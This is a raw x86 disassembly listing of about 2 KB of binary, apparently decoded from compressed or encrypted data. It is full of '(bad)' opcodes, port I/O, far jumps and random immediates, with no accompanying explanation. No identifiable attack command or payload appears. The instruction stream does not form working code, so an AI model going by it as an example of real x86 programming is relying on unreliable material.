  4178a7:	sbb    eax,DWORD PTR [esi+0x20]
  4178aa:	mov    edi,0xa8fd9c4e
  4178af:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178b1:	imul   DWORD PTR [ebx+0x34]
  4178b4:	scas   al,BYTE PTR es:[edi]
  4178b5:	push   es
  4178b6:	mov    ebp,0xcaaa473a
  4178bb:	enter  0x921f,0x8a
  4178bf:	mov    al,0x47
  4178c1:	xchg   esi,eax
  4178c2:	xchg   BYTE PTR [ebp+0x428cfd3c],bh
  4178c8:	adc    edx,edx
  4178ca:	ficom  WORD PTR [esi+0x3bd0ac6d]
  4178d0:	in     eax,dx
  4178d1:	jmp    0xc168:0xd126d294
  4178d8:	out    0x86,al
  4178da:	sub    al,0xa7
  4178dc:	scas   al,BYTE PTR es:[edi]
  4178dd:	loop   0x417904
  4178df:	xchg   ecx,eax
  4178e0:	bound  edi,QWORD PTR [ecx-0x6]
  4178e3:	sahf   
  4178e4:	imul   esi,edi,0x7a22e7bd
  4178ea:	pop    es
  4178eb:	or     al,0x7b
  4178ed:	mulps  xmm1,XMMWORD PTR [edi+0x74]
  4178f1:	adc    BYTE PTR [eax+0x4b6d6305],dl
  4178f7:	mov    bl,0x9
  4178f9:	xor    DWORD PTR [edx-0x509c9537],esi
  4178ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417900:	push   0x34
  417902:	into   
  417903:	cli    
  417904:	mov    ch,0x2d
  417906:	mov    esi,0x64ed8979
  41790b:	shr    DWORD PTR [eax+0x603e8b25],1
  417911:	icebp  
  417912:	jmp    0x3a14:0x8dbc791b
  417919:	stos   DWORD PTR es:[edi],eax
  41791a:	pusha  
  41791b:	dec    esp
  41791c:	xor    DWORD PTR [edx+0x7442c3da],edx
  417922:	xor    BYTE PTR [ecx],bl
  417924:	jmp    0x664b:0x476810f9
  41792b:	mov    ch,0xc3
  41792d:	and    al,0x0
  41792f:	jb     0x417975
  417931:	cli    
  417932:	push   edi
  417933:	dec    ecx
  417934:	adc    al,0xcd
  417936:	xchg   edx,eax
  417937:	push   edi
  417938:	ins    BYTE PTR es:[edi],dx
  417939:	pop    ebx
  41793a:	xchg   edi,eax
  41793b:	inc    ebx
  41793c:	pop    ebx
  41793d:	mov    al,ds:0x22aad016
  417942:	cli    
  417943:	loopne 0x41794d
  417945:	test   al,0xdb
  417947:	out    0xc,al
  417949:	mov    ebx,DWORD PTR [edx+0x7b]
  41794c:	sbb    al,0xe5
  41794e:	fisttp DWORD PTR [edi+edx*2]
  417951:	add    eax,0x88715a9f
  417956:	sub    DWORD PTR [ebp+0x38],edi
  417959:	adc    dl,BYTE PTR [esi]
  41795b:	ins    DWORD PTR es:[edi],dx
  41795c:	xor    eax,DWORD PTR [edx-0x7e]
  41795f:	into   
  417960:	stc    
  417961:	inc    esp
  417962:	inc    edi
  417963:	mov    edi,0xfe85915b
  417968:	pop    ds
  417969:	mov    ah,0x14
  41796b:	mov    eax,0x423499cd
  417970:	push   0x735fe632
  417975:	push   0x0
  417977:	ret    
  417978:	mov    bh,0xb9
  41797a:	and    ah,dl
  41797c:	jge    0x41790d
  41797e:	cwde   
  41797f:	mov    edx,0xeb78b8e3
  417984:	pop    ds
  417985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417986:	ficom  WORD PTR [esi+0x1c9e276d]
  41798c:	mov    ds:0x7a032c45,al
  417991:	popf   
  417992:	out    dx,al
  417993:	aaa    
  417994:	sub    eax,0x609431ed
  417999:	fs jp  0x417983
  41799c:	xchg   edx,eax
  41799d:	add    BYTE PTR [eax],al
  41799f:	add    BYTE PTR [eax],al
  4179a1:	add    BYTE PTR [esi],ah
  4179a3:	mov    ah,0x71
  4179a5:	jno    0x41799a
  4179a7:	cmc    
  4179a8:	div    DWORD PTR es:[edx+0x8]
  4179ac:	mov    eax,ds:0x9d7a1275
  4179b1:	scas   eax,DWORD PTR es:[edi]
  4179b2:	push   ds
  4179b3:	test   DWORD PTR [eax],0x4f300
  4179b9:	add    BYTE PTR [edx+0x6ab7e6e9],dh
  4179bf:	mov    bl,0x45
  4179c1:	scas   eax,DWORD PTR es:[edi]
  4179c2:	mov    ah,0x48
  4179c4:	lds    ecx,FWORD PTR [edx]
  4179c6:	out    0x7a,eax
  4179c8:	sub    ebx,ebp
  4179ca:	mov    ds:0x7731b8f3,al
  4179cf:	and    ebp,DWORD PTR [eax]
  4179d1:	mul    BYTE PTR [eax-0x2743d021]
  4179d7:	(bad)  
  4179d8:	pop    edi
  4179d9:	or     DWORD PTR [eax],esi
  4179db:	(bad)  
  4179dc:	xchg   edx,eax
  4179dd:	ins    BYTE PTR es:[edi],dx
  4179de:	stc    
  4179df:	popa   
  4179e0:	sub    DWORD PTR [ebp-0x5a],edx
  4179e3:	out    dx,al
  4179e4:	ret    
  4179e5:	lea    edi,[edx]
  4179e7:	adc    DWORD PTR [ecx+0x3b],eax
  4179ea:	xor    BYTE PTR ds:0xee5e0e4a,ah
  4179f0:	in     al,0xc6
  4179f2:	in     eax,0x9b
  4179f4:	and    BYTE PTR [ecx+0x2d],cl
  4179f7:	mov    bh,0xf8
  4179f9:	xchg   edi,eax
  4179fa:	(bad)  [ebp-0x1d]
  4179fd:	dec    eax
  4179fe:	hlt    
  4179ff:	out    dx,eax
  417a00:	push   eax
  417a01:	icebp  
  417a02:	ss push ebx
  417a04:	jle    0x4179ad
  417a06:	jmp    0xe6dd208e
  417a0b:	mov    esi,0x8db257bc
  417a10:	xor    BYTE PTR [edx],ah
  417a12:	test   eax,0x443ca404
  417a17:	jb     0x417a72
  417a19:	pop    esi
  417a1a:	sub    al,0x84
  417a1c:	mov    edi,0x6290af5e
  417a21:	push   0x38
  417a23:	iret   
  417a24:	jbe    0x417a55
  417a26:	rol    bl,0x70
  417a29:	xor    dh,BYTE PTR [ecx-0x60]
  417a2c:	stos   DWORD PTR es:[edi],eax
  417a2d:	into   
  417a2e:	popf   
  417a2f:	cs (bad) 
  417a32:	fwait
  417a33:	sub    BYTE PTR [ecx-0x28905976],0x6d
  417a3a:	mov    ebx,0x7f95ba6f
  417a3f:	pop    ss
  417a40:	push   ebx
  417a41:	adc    DWORD PTR [edx+0x56],esi
  417a44:	inc    ebp
  417a45:	pop    ss
  417a46:	sbb    eax,0x1079bf85
  417a4b:	mov    edi,DWORD PTR [edx]
  417a4d:	gs dec eax
  417a4f:	ss xor ecx,ecx
  417a52:	or     ebx,DWORD PTR [ebx+ebp*1-0x77c736f7]
  417a59:	dec    ebx
  417a5a:	outs   dx,DWORD PTR ds:[esi]
  417a5b:	mov    eax,ds:0xbd00e759
  417a60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a61:	dec    edx
  417a62:	xor    edx,ebp
  417a64:	(bad)  
  417a65:	(bad)  
  417a66:	out    dx,al
  417a67:	or     edx,DWORD PTR [edi]
  417a69:	hlt    
  417a6a:	push   edx
  417a6b:	cwde   
  417a6c:	(bad)  
  417a6d:	and    al,0xcf
  417a6f:	aas    
  417a70:	int    0xd7
  417a72:	sbb    BYTE PTR [esi],dh
  417a74:	(bad)  
  417a76:	fbld   TBYTE PTR [ecx]
  417a78:	and    ebx,0xa39ead06
  417a7e:	mov    cl,0x38
  417a80:	adc    eax,0x437ef15c
  417a85:	jecxz  0x417a4d
  417a87:	xor    DWORD PTR [ecx-0xd62ad3],eax
  417a8d:	jns    0x417a77
  417a8f:	in     eax,0x36
  417a91:	ja     0x417a70
  417a93:	xlat   BYTE PTR ds:[ebx]
  417a94:	dec    edx
  417a95:	fist   WORD PTR [esi]
  417a97:	push   ecx
  417a98:	ret    0x1f67
  417a9b:	out    0x9f,al
  417a9d:	daa    
  417a9e:	jmp    0x9f20:0x88144d22
  417aa5:	cmp    al,0x4b
  417aa7:	pop    ds
  417aa8:	test   BYTE PTR [edx-0x43d189aa],ah
  417aae:	push   ds
  417aaf:	daa    
  417ab0:	push   eax
  417ab1:	test   dh,0x4a
  417ab4:	push   esp
  417ab5:	push   ebp
  417ab6:	push   0xffffffbc
  417ab8:	inc    edx
  417ab9:	xchg   DWORD PTR [edx+0x42e6c74e],ebx
  417abf:	test   al,0xa5
  417ac1:	or     dh,BYTE PTR [esi]
  417ac3:	popf   
  417ac4:	xlat   BYTE PTR ds:[ebx]
  417ac5:	pop    es
  417ac6:	inc    esi
  417ac7:	add    BYTE PTR [ebx],0xce
  417aca:	sbb    BYTE PTR [ebx+0x17],dl
  417acd:	nop
  417ace:	repz test eax,0xfd69b235
  417ad4:	imul   BYTE PTR [esp+ebp*4-0x47637477]
  417adb:	jb     0x417ab5
  417add:	adc    ecx,edx
  417adf:	cli    
  417ae0:	adc    eax,0xa5b4ac9b
  417ae5:	add    ebx,ebx
  417ae7:	sub    cl,BYTE PTR [esi-0x35a47fef]
  417aed:	jns    0x417ac2
  417aef:	xor    DWORD PTR [edi+edi*2+0x1f],0x50
  417af4:	jl     0x417b16
  417af6:	add    al,0x1
  417af8:	mov    bl,0x92
  417afa:	add    DWORD PTR [edi-0x1077ed3a],ebp
  417b00:	ret    0xdd21
  417b03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b04:	jnp    0x417b4f
  417b06:	xchg   ebx,eax
  417b07:	jp     0x417b80
  417b09:	adc    al,0xe4
  417b0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b0c:	out    0x8,al
  417b0e:	add    DWORD PTR [esi-0x667026c4],esp
  417b14:	dec    edi
  417b16:	inc    eax
  417b17:	push   0x24
  417b19:	xchg   esp,eax
  417b1a:	shl    BYTE PTR [edi],cl
  417b1c:	mov    al,0x5f
  417b1e:	xchg   DWORD PTR [edx-0x63],ebx
  417b21:	std    
  417b22:	outs   dx,DWORD PTR ds:[esi]
  417b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b24:	stos   BYTE PTR es:[edi],al
  417b25:	push   es
  417b26:	jb     0x417afb
  417b28:	xchg   ebx,eax
  417b29:	jl     0x417b3a
  417b2b:	sub    BYTE PTR [esi+0x39],ch
  417b2e:	lods   al,BYTE PTR ds:[esi]
  417b2f:	stc    
  417b30:	sub    eax,0x58833647
  417b35:	cmp    ebx,DWORD PTR [esp+esi*2]
  417b38:	cmp    DWORD PTR [edx],ebx
  417b3a:	dec    esp
  417b3b:	cmp    eax,0x1c6f0796
  417b40:	push   ds
  417b41:	jne    0x417b0e
  417b43:	(bad)  
  417b44:	outs   dx,DWORD PTR ds:[esi]
  417b45:	popf   
  417b46:	fiadd  WORD PTR [edi-0x1f9c4dbb]
  417b4c:	out    0xa,eax
  417b4e:	(bad)  
  417b4f:	int3   
  417b50:	dec    ecx
  417b51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b52:	inc    ebp
  417b53:	pop    edx
  417b54:	push   0x25
  417b56:	pushf  
  417b57:	div    BYTE PTR cs:[eax+0x10]
  417b5b:	and    eax,esi
  417b5d:	xchg   ebx,eax
  417b5e:	jbe    0x417b8b
  417b60:	mov    dl,0x18
  417b62:	in     eax,0x32
  417b64:	popa   
  417b65:	xchg   DWORD PTR ds:[ebx],edi
  417b68:	(bad)  
  417b69:	and    dh,BYTE PTR ds:0x4ec771bb
  417b6f:	or     BYTE PTR [ebp-0x5af5210c],cl
  417b75:	ja     0x417b48
  417b77:	fstp   QWORD PTR [edi-0x2e1a1a24]
  417b7d:	aam    0xb3
  417b7f:	nop
  417b80:	mov    eax,0x83ed195e
  417b85:	or     al,0x8e
  417b87:	loop   0x417b33
  417b89:	addr16 aam 0x25
  417b8c:	pop    ecx
  417b8d:	fnstsw WORD PTR [eax]
  417b8f:	in     al,0x6f
  417b91:	int3   
  417b92:	fisub  DWORD PTR [ecx-0x631d31a3]
  417b98:	push   DWORD PTR [eax]
  417b9a:	ins    BYTE PTR es:[edi],dx
  417b9b:	scas   eax,DWORD PTR es:[edi]
  417b9c:	sbb    BYTE PTR [edi+ecx*4+0x72],ch
  417ba0:	sub    eax,0xfb634faa
  417ba5:	or     al,0x54
  417ba7:	aam    0x9c
  417ba9:	lahf   
  417baa:	sbb    ebx,DWORD PTR [eax]
  417bac:	je     0x417b2f
  417bae:	inc    ebx
  417baf:	mov    esi,DWORD PTR [ebx+0x601b0460]
  417bb5:	cdq    
  417bb6:	and    al,BYTE PTR [ebx+0x63]
  417bb9:	inc    edx
  417bba:	xor    esp,0xffffff9b
  417bbd:	sub    DWORD PTR [ecx-0x67],esi
  417bc0:	push   ss
  417bc1:	(bad)  
  417bc2:	sub    al,0x8c
  417bc4:	outs   dx,DWORD PTR ds:[esi]
  417bc5:	sbb    DWORD PTR [ebp+0x66],esp
  417bc8:	cmp    BYTE PTR [esi-0x39],ah
  417bcb:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  417bcd:	rol    eax,1
  417bcf:	lock xor eax,0xd8c7d905
  417bd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bd6:	lahf   
  417bd7:	push   ecx
  417bd8:	ins    BYTE PTR es:[edi],dx
  417bd9:	mov    bl,0xee
  417bdb:	sub    BYTE PTR [edx-0xb],cl
  417bde:	icebp  
  417bdf:	sbb    eax,0x939cb62a
  417be4:	xor    DWORD PTR [esi+0x4d0a5e1],edx
  417bea:	bound  ecx,QWORD PTR [esi]
  417bec:	out    dx,al
  417bed:	leave  
  417bee:	in     eax,0xc6
  417bf0:	dec    edi
  417bf1:	mov    dh,0xda
  417bf3:	jmp    0x7919:0x688efe20
  417bfa:	cmp    eax,ebp
  417bfc:	push   ecx
  417bfd:	or     al,0xda
  417bff:	fwait
  417c00:	pop    ebp
  417c01:	mov    al,0x26
  417c03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c04:	inc    esi
  417c05:	(bad)  
  417c06:	stos   DWORD PTR es:[edi],eax
  417c07:	ss pusha 
  417c09:	aaa    
  417c0a:	int3   
  417c0b:	(bad)  
  417c0c:	xchg   edx,eax
  417c0d:	xor    esi,DWORD PTR [eax+0x742f1865]
  417c13:	mov    DWORD PTR [eax],0x14bdffea
  417c19:	ins    DWORD PTR es:[edi],dx
  417c1a:	(bad)  
  417c1c:	fist   DWORD PTR ds:0xb81244ce
  417c22:	inc    ebx
  417c23:	retf   
  417c24:	jns    0x417c84
  417c26:	mov    cl,0xe1
  417c28:	lds    edi,FWORD PTR [esi-0x101f6216]
  417c2e:	pop    ecx
  417c2f:	fs loopne 0x417bb6
  417c32:	mov    ds,WORD PTR [edi+0x1f]
  417c35:	push   ds
  417c36:	xor    DWORD PTR [esi+0x78],esi
  417c39:	jp     0x417c35
  417c3b:	hlt    
  417c3c:	inc    esi
  417c3d:	ret    0xfeea
  417c40:	into   
  417c41:	(bad)  
  417c42:	fisttp WORD PTR [ebx-0x155e5d14]
  417c48:	dec    ecx
  417c49:	pop    ebx
  417c4a:	push   bx
  417c4c:	loope  0x417ca9
  417c4e:	push   ebp
  417c4f:	int    0xf7
  417c51:	jl     0x417c2b
  417c53:	add    ebx,esi
  417c55:	and    al,BYTE PTR [ebp-0x60]
  417c58:	add    esi,DWORD PTR [edx+0x201b09b2]
  417c5e:	jb     0x417c19
  417c60:	push   ecx
  417c61:	arpl   WORD PTR [edi],cx
  417c63:	dec    esp
  417c64:	lock loopne 0x417cde
  417c67:	xor    esi,DWORD PTR [edi-0x6d]
  417c6a:	jb     0x417c53
  417c6c:	jo     0x417cb4
  417c6e:	mov    edx,0xcaa6a016
  417c73:	and    DWORD PTR [ecx-0x62],0x22
  417c77:	push   esi
  417c78:	test   al,0x79
  417c7a:	std    
  417c7b:	add    DWORD PTR [esp+eax*2-0x74815a71],eax
  417c82:	pop    ds
  417c83:	pop    eax
  417c84:	cmp    al,0x4c
  417c86:	push   0x73
  417c88:	mov    ch,0x4c
  417c8a:	test   BYTE PTR [edi-0x7],bl
  417c8d:	cmovb  ebx,DWORD PTR [ecx+esi*2-0x12f812fa]
  417c95:	sbb    eax,0xaff51817
  417c9a:	jge    0xe5590f32
  417ca0:	fist   WORD PTR [ecx]
  417ca2:	gs pusha 
  417ca4:	imul   esp,DWORD PTR [esi+edx*1],0x751e58d9
  417cab:	in     al,0x30
  417cad:	bound  eax,QWORD PTR [esi-0x2dc0e812]
  417cb3:	or     eax,0xb41e81ca
  417cb8:	jae    0x417c98
  417cba:	sbb    DWORD PTR [ebx-0x79],eax
  417cbd:	pop    esp
  417cbe:	in     al,dx
  417cbf:	fstp   TBYTE PTR [ecx]
  417cc1:	retf   0x6d14
  417cc4:	jmp    0x4971222f
  417cc9:	es into 
  417ccb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ccc:	sbb    eax,0xb59e023e
  417cd1:	inc    ebp
  417cd2:	push   esp
  417cd3:	pop    edx
  417cd4:	mov    dl,0x1a
  417cd6:	push   eax
  417cd7:	xor    BYTE PTR fs:[edx+0x31057dd5],dh
  417cde:	xlat   BYTE PTR ds:[ebx]
  417cdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ce0:	mov    DWORD PTR [edi+0x7fe4d7e5],esp
  417ce6:	jb     0x417c8d
  417ce8:	mov    esi,0x5deaf699
  417ced:	fmul   QWORD PTR [eax-0x63dcb9bf]
  417cf3:	xchg   edi,eax
  417cf4:	jp     0x417cc1
  417cf6:	xor    al,0x13
  417cf8:	cmp    al,0xb4
  417cfa:	fld    DWORD PTR [esi-0x79]
  417cfd:	mov    eax,0xbaec767e
  417d02:	push   ebp
  417d03:	fstp   DWORD PTR [edx+edx*4-0x6e0606ae]
  417d0a:	hlt    
  417d0b:	sub    ecx,DWORD PTR [esp+ecx*2+0x73]
  417d0f:	xlat   BYTE PTR ds:[ebx]
  417d10:	nop
  417d11:	cmp    dl,0x4a
  417d14:	mov    cl,bh
  417d16:	sub    BYTE PTR ds:0x28e29f96,al
  417d1c:	xor    BYTE PTR [ecx],ch
  417d1e:	dec    edi
  417d1f:	lods   al,BYTE PTR ds:[esi]
  417d20:	jno    0x417d16
  417d22:	popa   
  417d23:	xchg   ecx,eax
  417d24:	ud2    
  417d26:	sub    cl,al
  417d28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d29:	call   0x156431a0
  417d2e:	push   ecx
  417d2f:	adc    eax,0xc7b0f229
  417d34:	xor    bl,cl
  417d36:	adc    BYTE PTR [ebp+0xc],bl
  417d39:	or     al,0x57
  417d3b:	cdq    
  417d3c:	jmp    0x417d16
  417d3e:	dec    esp
  417d3f:	sbb    eax,0x10213eed
  417d44:	xlat   BYTE PTR ds:[ebx]
  417d45:	int3   
  417d46:	fs inc esp
  417d48:	ds jae 0x417d44
  417d4b:	mov    bl,BYTE PTR [esi]
  417d4d:	pop    es
  417d4e:	das    
  417d4f:	(bad)  
  417d50:	mov    edx,0xea9aabc6
  417d55:	mov    BYTE PTR [ecx+0x27cb10c0],ch
  417d5b:	js     0x417d84
  417d5d:	jg     0x417d95
  417d5f:	mov    ds:0xfd4a3aa4,al
  417d64:	push   ecx
  417d65:	sahf   
  417d66:	icebp  
  417d67:	jno    0x417d41
  417d69:	dec    ebp
  417d6a:	inc    esp
  417d6b:	aad    0x13
  417d6d:	test   BYTE PTR [esi+0x1e],ah
  417d70:	repnz xchg edi,eax
  417d72:	rcr    DWORD PTR [eax+0x7],0xc3
  417d76:	les    ecx,FWORD PTR [esp+edi*8]
  417d79:	mov    al,es:0x3bc63046
  417d7f:	ss in  eax,0x86
  417d82:	out    dx,al
  417d83:	mov    edi,0xe14c8fc
  417d88:	inc    ebx
  417d89:	cmp    eax,0xcfd18a4
  417d8e:	rol    BYTE PTR ds:0x87d3b298,cl
  417d94:	retf   0x3f3c
  417d97:	stc    
  417d98:	and    BYTE PTR [edx],dh
  417d9a:	out    dx,al
  417d9b:	(bad)  
  417d9c:	push   ds
  417d9d:	xchg   esi,eax
  417d9e:	in     eax,0x69
  417da0:	dec    esi
  417da1:	ja     0x417d39
  417da3:	mov    ebx,0x55e4d1f2
  417da8:	shl    DWORD PTR [eax+eax*4],cl
  417dab:	pop    ecx
  417dac:	push   ds
  417dad:	sbb    BYTE PTR [esi-0x5aae3c9],dh
  417db3:	mov    ds:0xb7364f51,eax
  417db8:	lods   eax,DWORD PTR ds:[esi]
  417db9:	or     al,0x13
  417dbb:	push   edx
  417dbc:	data16 in al,dx
  417dbe:	scas   al,BYTE PTR es:[edi]
  417dbf:	inc    esi
  417dc0:	xchg   ebp,eax
  417dc1:	ins    DWORD PTR es:[edi],dx
  417dc2:	retf   0x5a22
  417dc5:	jo     0x417df4
  417dc7:	sub    ah,BYTE PTR [edx]
  417dc9:	shl    DWORD PTR [esi+0x1f0e07a4],1
  417dcf:	xor    dh,BYTE PTR [ebp+0x62016cb5]
  417dd5:	scas   eax,DWORD PTR es:[edi]
  417dd6:	mov    al,0xdc
  417dd8:	inc    esp
  417dd9:	mov    ?,ebp
  417ddb:	pop    ebx
  417ddc:	aas    
  417ddd:	pop    es
  417dde:	lahf   
  417ddf:	mov    ch,0x3c
  417de1:	add    eax,0xfbfc42e4
  417de6:	mov    ecx,0xd903f518
  417deb:	add    dl,BYTE PTR [ecx+0x6557afff]
  417df1:	adc    al,0x25
  417df3:	and    BYTE PTR [edx-0x31],cl
  417df6:	jmp    0x417e6e
  417df8:	ret    
  417df9:	sbb    esi,DWORD PTR [ecx-0x1128effe]
  417dff:	psrlq  mm3,QWORD PTR [eax]
  417e02:	mov    edx,0xc70e573d
  417e07:	mov    cl,0x34
  417e09:	shl    DWORD PTR [edi],cl
  417e0b:	das    
  417e0c:	shr    BYTE PTR [ebx],0x29
  417e0f:	ins    DWORD PTR es:[edi],dx
  417e10:	sbb    edi,ebp
  417e12:	test   ah,0xdd
  417e15:	jle    0x417e4e
  417e17:	mov    ds:0x3e32cd06,al
  417e1c:	push   esi
  417e1d:	or     eax,0x9329c1d0
  417e22:	loopne 0x417e6f
  417e24:	repz adc eax,0x6c63a94e
  417e2a:	and    eax,0xb062e17f
  417e2f:	inc    ebx
  417e30:	cmp    BYTE PTR [esi-0x6c8e04f4],0xb1
  417e37:	adc    BYTE PTR [edx-0x20],0xe9
  417e3b:	or     al,BYTE PTR [ebp+0x19]
  417e3e:	(bad)  
  417e3f:	push   ecx
  417e40:	(bad)  
  417e41:	call   0x486b:0x8d37d0d4
  417e48:	dec    ebp
  417e49:	test   BYTE PTR [edx],dl
  417e4b:	(bad)  
  417e4c:	(bad)  
  417e4d:	push   eax
  417e4e:	hlt    
  417e4f:	sbb    eax,0x557a36
  417e54:	aam    0x6c
  417e56:	repz mov ds:0x9c0b38c2,eax
  417e5c:	mov    ebx,0x32145b84
  417e61:	mov    bl,0x28
  417e63:	fcomp  DWORD PTR [ebp-0x32]
  417e66:	mov    ds:0x60ccd53a,eax
  417e6b:	icebp  
  417e6c:	int    0x4d
  417e6e:	cld    
  417e6f:	(bad)  
  417e70:	fwait
  417e71:	add    ah,ch
  417e73:	sbb    eax,0x7df64eb5
  417e78:	imul   BYTE PTR [ebx-0x66]
  417e7b:	mov    edx,0x1b794ac4
  417e80:	dec    edi
  417e81:	dec    edi
  417e82:	popf   
  417e83:	jmp    0x417f04
  417e85:	scas   al,BYTE PTR es:[edi]
  417e86:	jb     0x417ebf
  417e88:	xchg   edx,eax
  417e89:	cmc    
  417e8a:	es faddp st(2),st
  417e8d:	test   DWORD PTR [ecx],edi
  417e8f:	and    DWORD PTR [esi],esi
  417e91:	retf   
  417e92:	enter  0xaf37,0x4f
  417e96:	mov    DWORD PTR [eax-0x6a],0x9fcf0f5a
  417e9d:	fisubr DWORD PTR [esi-0x38]
  417ea0:	and    ecx,esi
  417ea2:	push   ebx
  417ea3:	lahf   
  417ea4:	outs   dx,BYTE PTR ds:[esi]
  417ea5:	jl     0x417e2c
  417ea7:	shr    DWORD PTR [ebx-0x2c0fa894],cl
  417ead:	add    BYTE PTR [eax],al
  417eaf:	add    BYTE PTR [eax],al
  417eb1:	add    dl,al
  417eb3:	sahf   
  417eb4:	xchg   ebx,eax
  417eb5:	inc    edi
  417eb6:	fisttp WORD PTR [edi-0x2a]
  417eb9:	lahf   
  417eba:	int    0x45
  417ebc:	push   eax
  417ebd:	(bad)  
  417ebf:	cld    
  417ec0:	mov    ah,0x19
  417ec2:	adc    esp,edi
  417ec4:	add    BYTE PTR [eax],al
  417ec6:	repz add al,0x0
  417ec9:	add    BYTE PTR [ebx-0x3ebaa259],bl
  417ecf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ed0:	loop   0x417eba
  417ed2:	scas   eax,DWORD PTR es:[edi]
  417ed3:	shr    BYTE PTR ds:0x3e6b3f0f,1
  417ed9:	jb     0x417ed2
  417edb:	imul   esp,esi,0xb0d0fe4c
  417ee1:	push   ds
  417ee2:	aaa    
  417ee3:	fldenv [ecx+0x732ba171]
  417ee9:	xor    esi,edi
  417eeb:	adc    eax,0x82edff69
  417ef0:	out    dx,eax
  417ef1:	call   0x721af188
  417ef6:	mov    eax,0x14a3df19
  417efb:	pop    edx
  417efc:	inc    edi
  417efd:	mov    ds:0xa95ae56d,eax
  417f02:	mov    edx,0x67d4b7de
  417f07:	pop    ds
  417f08:	lahf   
  417f09:	lahf   
  417f0a:	aam    0xb7
  417f0c:	cmp    eax,0x65d69426
  417f11:	es cmp edx,ebx
  417f14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f15:	and    edx,ebx
  417f17:	xor    edi,0x7
  417f1a:	mov    bh,BYTE PTR [edi-0x1b]
  417f1d:	aaa    
  417f1e:	push   ecx
  417f1f:	push   eax
  417f20:	mov    dh,0x37
  417f22:	fwait
  417f23:	sub    DWORD PTR gs:[edi-0x2b],ecx
  417f27:	pop    edx
  417f28:	sbb    al,0xf7
  417f2a:	adc    DWORD PTR [edi],ebx
  417f2c:	frstor [edi-0x35]
  417f2f:	xchg   edi,eax
  417f30:	aam    0xe6
  417f32:	pop    edi
  417f33:	add    dl,cl
  417f35:	popf   
  417f36:	fdiv   st(6),st
  417f38:	rcr    BYTE PTR [esp+ebx*2],0x71
  417f3c:	and    eax,0x862a0c01
  417f41:	mov    ebx,0x431ea8d3
  417f46:	(bad)  
  417f47:	fiadd  DWORD PTR [eax]
  417f49:	or     esp,DWORD PTR [eax]
  417f4b:	and    dl,cl
  417f4d:	dec    esi
  417f4e:	inc    dx
  417f50:	inc    ebx
  417f51:	aad    0x16
  417f53:	pop    ebx
  417f54:	adc    DWORD PTR [edi],ebx
  417f56:	fld    TBYTE PTR [ecx]
  417f58:	daa    
  417f59:	and    eax,0x2bc0b497
  417f5e:	std    
  417f5f:	loope  0x417fb3
  417f61:	out    0x56,eax
  417f63:	arpl   WORD PTR [eax],bx
  417f65:	xor    dh,0xbb
  417f68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f69:	stos   BYTE PTR es:[edi],al
  417f6a:	mov    al,0xb3
  417f6c:	in     eax,0x69
  417f6e:	sbb    ch,BYTE PTR [esi+0x25]
  417f71:	dec    esi
  417f72:	jmp    0xf948:0x7d4cadb3
  417f79:	mov    ah,0x6a
  417f7b:	and    al,0x5a
  417f7d:	push   ecx
  417f7e:	mov    ch,0xd9
  417f80:	sbb    ch,ah
  417f82:	iret   
  417f83:	stos   BYTE PTR es:[edi],al
  417f84:	xlat   BYTE PTR ds:[ebx]
  417f85:	stc    
  417f86:	push   esp
  417f87:	lods   al,BYTE PTR ds:[esi]
  417f88:	or     esi,edi
  417f8a:	test   BYTE PTR [ebp+esi*1-0x17ab526f],cl
  417f91:	clc    
  417f92:	icebp  
  417f93:	pop    es
  417f94:	out    0x61,eax
  417f96:	pushf  
  417f97:	call   DWORD PTR [esi+0x2a564879]
  417f9d:	loopne 0x417fff
  417f9f:	adc    al,0x69
  417fa1:	pushf  
  417fa2:	aas    
  417fa3:	out    dx,eax
  417fa4:	ret    
  417fa5:	and    DWORD PTR [esi+edx*8-0x7065bf51],edi
  417fac:	jmp    0x9bee8944
  417fb1:	mov    ss,WORD PTR [esi+0x20]
  417fb4:	out    dx,eax
  417fb5:	pop    ebx
  417fb6:	test   DWORD PTR [eax-0x36fca0ad],0xd0f97f27
  417fc0:	cmp    ecx,esp
  417fc2:	jecxz  0x41802d
  417fc4:	inc    esp
  417fc5:	dec    ebx
  417fc6:	fcomip st,st(2)
  417fc8:	sub    BYTE PTR [esi-0x1323793a],dl
  417fce:	xchg   ecx,eax
  417fcf:	dec    esi
  417fd0:	jns    0x418001
  417fd2:	daa    
  417fd3:	mov    ecx,0x24141fb9
  417fd8:	adc    bl,ch
  417fda:	(bad)  
  417fdc:	push   ds
  417fdd:	fisttp DWORD PTR [ebx+0x0]
  417fe0:	mov    ds:0x77aa9a3a,al
  417fe5:	and    ch,ah
  417fe7:	(bad)  [ecx-0x46054f27]
  417fed:	lfs    ebx,FWORD PTR [ebx+esi*8-0x5ca77438]
  417ff5:	aas    
  417ff6:	inc    eax
  417ff7:	and    al,0x50
  417ff9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ffa:	loope  0x417fd7
  417ffc:	inc    eax
  417ffd:	inc    eax
  417ffe:	mov    dh,0x76
  418000:	cs push ebp
  418002:	outs   dx,DWORD PTR ds:[esi]
  418003:	sti    
  418004:	lock inc ebx
  418006:	int    0x31
  418008:	adc    al,0xd
  41800a:	outs   dx,DWORD PTR ds:[esi]
  41800b:	cdq    
  41800c:	hlt    
  41800d:	and    BYTE PTR gs:[ecx-0x50],al
  418011:	js     0x418048
  418013:	add    DWORD PTR [edi-0x17741e3f],edi
  418019:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41801a:	enter  0x4a4a,0x74
  41801e:	(bad)  
  418020:	xchg   ebx,eax
